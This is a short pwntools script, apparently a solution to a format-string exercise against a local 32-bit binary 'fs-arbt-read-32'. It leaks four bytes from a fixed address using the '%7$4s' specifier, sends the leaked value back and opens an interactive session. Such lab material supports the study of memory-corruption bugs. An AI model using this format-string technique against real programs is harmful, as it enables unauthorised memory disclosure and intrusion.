#!/usr/bin/env python

from pwn import *

p = process("./fs-arbt-read-32")

p.sendline(p32(0x804a050) + "%7$4s")
data = p.recv()
data = data.split()
data = data[6]
data = data[-4:]

conv = u32(data)
conv = str(hex(conv))
p.sendline(conv)
print(p.recv())

p.interactive()
